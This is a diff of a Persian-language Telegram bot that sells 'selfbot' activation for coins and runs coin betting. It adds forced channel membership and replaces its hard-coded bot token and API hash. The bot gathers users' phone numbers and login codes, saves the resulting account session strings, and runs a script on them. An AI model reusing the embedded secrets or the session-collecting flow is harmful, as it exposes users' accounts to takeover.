@@ -22,7 +22,7 @@ logging.basicConfig(
 )
 
 # حالت‌های مکالمه
-ACTIVATION_PANEL, GET_PHONE, GET_CODE, COIN_PURCHASE, CONFIRM_PURCHASE = range(5)
+CHECK_MEMBERSHIP, ACTIVATION_PANEL, GET_PHONE, GET_CODE, COIN_PURCHASE, CONFIRM_PURCHASE = range(6)
 
 class TelegramAuthBot:
     def __init__(self, token, api_id, api_hash):
@@ -49,7 +49,10 @@ class TelegramAuthBot:
         self.user_first_start = {}
         self.active_bets = {}
         self.group_bets = {}
-        self.owner_id = 123456789  # آیدی مالک رو اینجا بذار
+        
+        # لیست کانال‌های اجباری
+        self.required_channels = ["SelfMR1", "SELF_MR0"]
+        self.owner_id = 6691993264  # آیدی مالک
         
         # دیتابیس کاربران
         self.init_users_db()
@@ -95,10 +98,16 @@ class TelegramAuthBot:
         self.application.add_handler(CallbackQueryHandler(self.join_group_bet, pattern='^join_gbet_'))
         self.application.add_handler(CallbackQueryHandler(self.cancel_group_bet, pattern='^cancel_gbet_'))
         
-        # مکالمه برای فعال‌سازی سلف
+        # مکالمه
         conv_handler = ConversationHandler(
-            entry_points=[CommandHandler('activate', self.start_activation)],
+            entry_points=[CommandHandler('start', self.start)],
             states={
+                CHECK_MEMBERSHIP: [
+                    CallbackQueryHandler(self.check_membership, pattern='^(check|join|join2)$')
+                ],
+                ACTIVATION_PANEL: [
+                    CallbackQueryHandler(self.activation_panel, pattern='^(activate|support|buy_coins|back|stats|invite)$')
+                ],
                 GET_PHONE: [
                     MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_phone_number)
                 ],
@@ -121,6 +130,18 @@ class TelegramAuthBot:
     def is_owner(self, user_id: int) -> bool:
         return user_id == self.owner_id
     
+    def create_welcome_keyboard(self):
+        keyboard = [
+            [
+                InlineKeyboardButton("📥 کانال اول", url="https://t.me/SelfMR1"),
+                InlineKeyboardButton("📥 کانال دوم", url="https://t.me/SELF_MR0")
+            ],
+            [
+                InlineKeyboardButton("✅ بررسی عضویت", callback_data="check")
+            ]
+        ]
+        return InlineKeyboardMarkup(keyboard)
+    
     def create_activation_keyboard(self):
         keyboard = [
             [
@@ -132,7 +153,7 @@ class TelegramAuthBot:
                 InlineKeyboardButton("🎫 لینک دعوت", callback_data="invite")
             ],
             [
-                InlineKeyboardButton("🛟 پشتیبانی", url="https://t.me/Sourrce_kade")
+                InlineKeyboardButton("🛟 پشتیبانی", url="https://t.me/SelfMR1")
             ]
         ]
         return InlineKeyboardMarkup(keyboard)
@@ -252,7 +273,6 @@ class TelegramAuthBot:
         return InlineKeyboardMarkup(keyboard)
 
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """دستور start - ورود به ربات بدون نیاز به عضویت"""
         user_id = update.message.from_user.id
         
         if self.is_owner(user_id):
@@ -264,17 +284,14 @@ class TelegramAuthBot:
             if invite_code in self.invite_links:
                 referrer_id = self.invite_links[invite_code]
                 
-                # اهدای 7 سکه به دعوت کننده
                 if referrer_id not in self.user_coins:
                     self.user_coins[referrer_id] = 0
                 self.user_coins[referrer_id] += 7
                 
-                # ذخیره اطلاعات دعوت شونده
                 if referrer_id not in self.user_referrals:
                     self.user_referrals[referrer_id] = []
                 self.user_referrals[referrer_id].append(user_id)
                 
-                # اطلاع به دعوت کننده
                 try:
                     await context.bot.send_message(
                         chat_id=referrer_id,
@@ -294,63 +311,126 @@ class TelegramAuthBot:
                     "💰 موجودی فعلی: 3 سکه"
                 )
         
-        # صفحه اصلی ربات
         welcome_text = (
-            "🤖 **به ربات SelfStruct خوش آمدید!**\n\n"
-            "از این ربات می‌توانید برای فعال‌سازی سلف‌بات استفاده کنید.\n\n"
-            "💡 **راهنمای سریع:**\n"
-            "• برای فعال‌سازی سلف روی دکمه 🚀 فعال سازی سلف کلیک کنید\n"
-            "• برای خرید سکه روی دکمه 💰 خرید سکه کلیک کنید\n"
-            "• برای مشاهده آمار روی دکمه 📊 آمار و موجودی کلیک کنید\n"
-            "• برای دریافت لینک دعوت روی دکمه 🎫 لینک دعوت کلیک کنید\n\n"
-            "💰 **هر سکه = 200 تومن**\n"
-            "🔮 **پشتیبانی:** @Sourrce_kade"
+            "🔰 **به ربات خوش آمدید!**\n\n"
+            "برای استفاده از ربات باید در کانال‌های زیر عضو شوید:\n"
+            "📌 @SelfMR1\n"
+            "📌 @SELF_MR0\n\n"
+            "پس از عضویت، روی دکمه ✅ بررسی عضویت کلیک کنید."
         )
         
         await update.message.reply_text(
             welcome_text,
-            reply_markup=self.create_activation_keyboard()
+            reply_markup=self.create_welcome_keyboard(),
+            parse_mode='Markdown'
         )
-        return ACTIVATION_PANEL
+        return CHECK_MEMBERSHIP
     
-    async def start_activation(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """شروع فرآیند فعال‌سازی سلف"""
-        user_id = update.message.from_user.id
-        user_coins = self.user_coins.get(user_id, 0)
+    async def check_membership(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        query = update.callback_query
+        await query.answer()
         
-        if user_coins < 3:
-            await update.message.reply_text(
-                f"❌ موجودی سکه شما کافی نیست!\n\n"
-                f"💰 موجودی فعلی: {user_coins} سکه\n"
-                f"💸 برای فعال‌سازی سلف به 3 سکه نیاز دارید.\n\n"
-                f"لطفاً از بخش '💰 خرید سکه' اقدام به خرید نمایید.",
-                reply_markup=self.create_activation_keyboard()
+        user_id = query.from_user.id
+        
+        if query.data == "join" or query.data == "join2":
+            await query.edit_message_text(
+                "📥 در حال انتقال به کانال...\n\n"
+                "پس از پیوستن به هر دو کانال، روی دکمه '✅ بررسی عضویت' کلیک کنید.",
+                reply_markup=self.create_welcome_keyboard()
             )
-            return ACTIVATION_PANEL
+            return CHECK_MEMBERSHIP
         
-        phone_text = (
-            "📱 لطفاً شماره تلفن خود را به صورت دستی ارسال کنید:\n\n"
-            "📝 فرمت پیشنهادی:\n"
-            "• +989123456789\n"
-            "• 09123456789\n\n"
-            "⚠️ شماره باید معتبر و قابل دریافت کد باشد."
-        )
+        await query.edit_message_text("🔍 در حال بررسی عضویت شما...")
         
-        await update.message.reply_text(
-            phone_text,
-            reply_markup=self.create_phone_keyboard()
-        )
-        return GET_PHONE
+        try:
+            client = TelegramClient(StringSession(), self.api_id, self.api_hash)
+            await client.start(bot_token=self.token)
+            
+            all_members = True
+            not_member_channels = []
+            
+            for channel_username in self.required_channels:
+                try:
+                    channel = await client.get_entity(channel_username)
+                    await client(GetParticipantRequest(channel=channel, participant=user_id))
+                except UserNotParticipantError:
+                    all_members = False
+                    not_member_channels.append(f"@{channel_username}")
+                except Exception as e:
+                    logging.error(f"Error checking channel {channel_username}: {e}")
+                    all_members = False
+                    not_member_channels.append(f"@{channel_username}")
+            
+            if all_members:
+                await query.edit_message_text("🎉 عضویت شما در هر دو کانال تأیید شد!")
+                
+                activation_text = (
+                    "💡 **پنل اصلی ربات**\n\n"
+                    "از دکمه‌های زیر برای استفاده از ربات استفاده کنید:\n"
+                    "🚀 فعال سازی سلف\n"
+                    "💰 خرید سکه\n"
+                    "📊 آمار و موجودی\n"
+                    "🎫 لینک دعوت"
+                )
+                
+                await query.edit_message_text(
+                    text=activation_text,
+                    reply_markup=self.create_activation_keyboard()
+                )
+                
+                await client.disconnect()
+                return ACTIVATION_PANEL
+            else:
+                channels_text = "\n".join(not_member_channels)
+                await query.edit_message_text(
+                    f"❌ شما هنوز در همه کانال‌ها عضو نشده‌اید!\n\n"
+                    f"کانال‌های مورد نیاز:\n{channels_text}\n\n"
+                    f"لطفاً ابتدا به همه کانال‌ها بپیوندید سپس روی '✅ بررسی عضویت' کلیک کنید.",
+                    reply_markup=self.create_welcome_keyboard()
+                )
+                await client.disconnect()
+                return CHECK_MEMBERSHIP
+                
+        except Exception as e:
+            logging.error(f"Error checking membership: {e}")
+            await query.edit_message_text(
+                "❌ خطا در بررسی عضویت!\n\n"
+                "لطفاً دوباره تلاش کنید.",
+                reply_markup=self.create_welcome_keyboard()
+            )
+            return CHECK_MEMBERSHIP
     
     async def activation_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """پنل اصلی ربات"""
         query = update.callback_query
         await query.answer()
         
         user_id = query.from_user.id
         
         if query.data == "activate":
-            return await self.start_activation(query, context)
+            user_coins = self.user_coins.get(user_id, 0)
+            if user_coins < 3:
+                await query.edit_message_text(
+                    f"❌ موجودی سکه شما کافی نیست!\n\n"
+                    f"💰 موجودی فعلی: {user_coins} سکه\n"
+                    f"💸 برای فعال‌سازی سلف به 3 سکه نیاز دارید.\n\n"
+                    f"لطفاً از بخش '💰 خرید سکه' اقدام به خرید نمایید.",
+                    reply_markup=self.create_activation_keyboard()
+                )
+                return ACTIVATION_PANEL
+            
+            phone_text = (
+                "📱 لطفاً شماره تلفن خود را به صورت دستی ارسال کنید:\n\n"
+                "📝 فرمت پیشنهادی:\n"
+                "• +989123456789\n"
+                "• 09123456789\n\n"
+                "⚠️ شماره باید معتبر و قابل دریافت کد باشد."
+            )
+            
+            await query.edit_message_text(
+                phone_text,
+                reply_markup=self.create_phone_keyboard()
+            )
+            return GET_PHONE
         
         elif query.data == "buy_coins":
             coin_text = (
@@ -382,26 +462,22 @@ class TelegramAuthBot:
             return ACTIVATION_PANEL
         
         elif query.data == "back":
-            welcome_text = (
-                "🤖 **به ربات SelfStruct خوش آمدید!**\n\n"
-                "از این ربات می‌توانید برای فعال‌سازی سلف‌بات استفاده کنید.\n\n"
-                "💡 **راهنمای سریع:**\n"
-                "• برای فعال‌سازی سلف روی دکمه 🚀 فعال سازی سلف کلیک کنید\n"
-                "• برای خرید سکه روی دکمه 💰 خرید سکه کلیک کنید\n"
-                "• برای مشاهده آمار روی دکمه 📊 آمار و موجودی کلیک کنید\n"
-                "• برای دریافت لینک دعوت روی دکمه 🎫 لینک دعوت کلیک کنید\n\n"
-                "💰 **هر سکه = 200 تومن**\n"
-                "🔮 **پشتیبانی:** @Sourrce_kade"
+            activation_text = (
+                "💡 **پنل اصلی ربات**\n\n"
+                "از دکمه‌های زیر برای استفاده از ربات استفاده کنید:\n"
+                "🚀 فعال سازی سلف\n"
+                "💰 خرید سکه\n"
+                "📊 آمار و موجودی\n"
+                "🎫 لینک دعوت"
             )
             
             await query.edit_message_text(
-                welcome_text,
+                activation_text,
                 reply_markup=self.create_activation_keyboard()
             )
             return ACTIVATION_PANEL
     
     async def show_stats_panel(self, query):
-        """نمایش پنل آمار و موجودی"""
         user_id = query.from_user.id
         user_coins = self.user_coins.get(user_id, 0)
         total_value = user_coins * 200
@@ -422,7 +498,6 @@ class TelegramAuthBot:
         )
     
     async def show_invite_panel(self, query, context: ContextTypes.DEFAULT_TYPE):
-        """نمایش پنل لینک دعوت"""
         user_id = query.from_user.id
         username = query.from_user.username or f"user_{user_id}"
         
@@ -484,7 +559,7 @@ class TelegramAuthBot:
                 f"🩸 𝐌𝐨𝐧𝐞𝐲 ➜ {total_price:,} تومن\n"
                 f"💌 𝐂𝐨𝐢𝐧 ➜ {coin_count} سکه\n\n"
                 f"       𝟼𝟷𝟶𝟺 𝟹𝟹𝟽𝟿 𝟻𝟸𝟶𝟺 𝟼𝟽𝟹𝟼\n\n"
-                f"😘 کاربر گرامی برای خرید ابتدا مبلغ تعیین شده رو به شماره کارت بالا انتقال داده سپس عکس از رسید را برای مالک سلف ارسال کنید ❤️‍🩹 @sinyoremad"
+                f"😘 کاربر گرامی برای خرید ابتدا مبلغ تعیین شده رو به شماره کارت بالا انتقال داده سپس عکس از رسید را برای مالک سلف ارسال کنید ❤️‍🩹 @SelfMR1"
             )
             
             await query.edit_message_text(purchase_text)
@@ -529,7 +604,7 @@ class TelegramAuthBot:
                 f"🩸 𝐌𝐨𝐧𝐞𝐲 ➜ {total_price:,} تومن\n"
                 f"💌 𝐂𝐨𝐢𝐧 ➜ {coin_count} سکه\n\n"
                 f"       𝟼𝟷𝟶𝟺 𝟹𝟹𝟽𝟿 𝟻𝟸𝟶𝟺 𝟼𝟽𝟹𝟼\n\n"
-                f"😘 کاربر گرامی برای خرید ابتدا مبلغ تعیین شده رو به شماره کارت بالا انتقال داده سپس عکس از رسید را برای مالک سلف ارسال کنید ❤️‍🩹 @sinyoremad"
+                f"😘 کاربر گرامی برای خرید ابتدا مبلغ تعیین شده رو به شماره کارت بالا انتقال داده سپس عکس از رسید را برای مالک سلف ارسال کنید ❤️‍🩹 @SelfMR1"
             )
             
             await query.edit_message_text(final_purchase_text)
@@ -554,20 +629,17 @@ class TelegramAuthBot:
         user_id = update.message.from_user.id
         
         if user_input == "🔙 بازگشت به منوی اصلی":
-            welcome_text = (
-                "🤖 **به ربات SelfStruct خوش آمدید!**\n\n"
-                "از این ربات می‌توانید برای فعال‌سازی سلف‌بات استفاده کنید.\n\n"
-                "💡 **راهنمای سریع:**\n"
-                "• برای فعال‌سازی سلف روی دکمه 🚀 فعال سازی سلف کلیک کنید\n"
-                "• برای خرید سکه روی دکمه 💰 خرید سکه کلیک کنید\n"
-                "• برای مشاهده آمار روی دکمه 📊 آمار و موجودی کلیک کنید\n"
-                "• برای دریافت لینک دعوت روی دکمه 🎫 لینک دعوت کلیک کنید\n\n"
-                "💰 **هر سکه = 200 تومن**\n"
-                "🔮 **پشتیبانی:** @Sourrce_kade"
+            activation_text = (
+                "💡 **پنل اصلی ربات**\n\n"
+                "از دکمه‌های زیر برای استفاده از ربات استفاده کنید:\n"
+                "🚀 فعال سازی سلف\n"
+                "💰 خرید سکه\n"
+                "📊 آمار و موجودی\n"
+                "🎫 لینک دعوت"
             )
             
             await update.message.reply_text(
-                welcome_text,
+                activation_text,
                 reply_markup=self.create_activation_keyboard()
             )
             return ACTIVATION_PANEL
@@ -745,7 +817,6 @@ class TelegramAuthBot:
             success = await self.activate_selfbot(session_string, user_id, phone_number)
             
             if success:
-                # کسر 3 سکه از موجودی کاربر
                 if user_id in self.user_coins and self.user_coins[user_id] >= 3:
                     self.user_coins[user_id] -= 3
                 
@@ -809,14 +880,11 @@ class TelegramAuthBot:
             return ConversationHandler.END
     
     async def activate_selfbot(self, session_string: str, user_id: int, phone_number: str):
-        """فعال‌سازی خودکار سلف بات"""
         try:
-            # ذخیره سشن در فایل موقت
             temp_file = f"session_{user_id}.txt"
             with open(temp_file, 'w') as f:
                 f.write(session_string)
             
-            # اجرای سلف بات در فرآیند جداگانه
             subprocess.Popen([
                 sys.executable, 'self.py',
                 '--session', temp_file,
@@ -824,7 +892,6 @@ class TelegramAuthBot:
                 '--api-hash', self.api_hash
             ])
             
-            # ذخیره اطلاعات در دیتابیس
             conn = sqlite3.connect('users.db')
             cursor = conn.cursor()
             cursor.execute('''INSERT OR REPLACE INTO users 
@@ -855,7 +922,6 @@ class TelegramAuthBot:
     # ===== متدهای شرط‌بندی و انتقال سکه =====
     
     async def create_bet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """ایجاد شرط‌بندی جدید"""
         user_id = update.message.from_user.id
         username = update.message.from_user.username or f"user_{user_id}"
         
@@ -915,7 +981,6 @@ class TelegramAuthBot:
             await update.message.reply_text("❌ لطفاً یک عدد معتبر وارد کنید!")
     
     async def create_group_bet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """ایجاد شرط‌بندی گروهی"""
         user_id = update.message.from_user.id
         username = update.message.from_user.username or f"user_{user_id}"
         chat_id = update.message.chat_id
@@ -983,7 +1048,6 @@ class TelegramAuthBot:
             await update.message.reply_text("❌ لطفاً یک عدد معتبر وارد کنید!")
     
     async def finish_group_bet(self, bet_id: str, context: ContextTypes.DEFAULT_TYPE):
-        """پایان دادن به شرط‌بندی گروهی پس از 5 دقیقه"""
         await asyncio.sleep(300)
         
         if bet_id not in self.group_bets:
@@ -1508,9 +1572,9 @@ class TelegramAuthBot:
         )
 
 if __name__ == "__main__":
-    BOT_TOKEN = "8858887304:AAELneONarg-zYTRBAWocRV9NO9xRzodFFg"
+    BOT_TOKEN = "8484770380:AAFG8PDYIwfRj3HD5QvZZtWwXuufisLTtXc"
     API_ID = 34996139
-    API_HASH = "a1f3db16cae2919cfb05e61d1e968b8d"
+    API_HASH = "00877cdcd706564a4de6abf7f7d64349"
     
     bot = TelegramAuthBot(BOT_TOKEN, API_ID, API_HASH)
     bot.run()
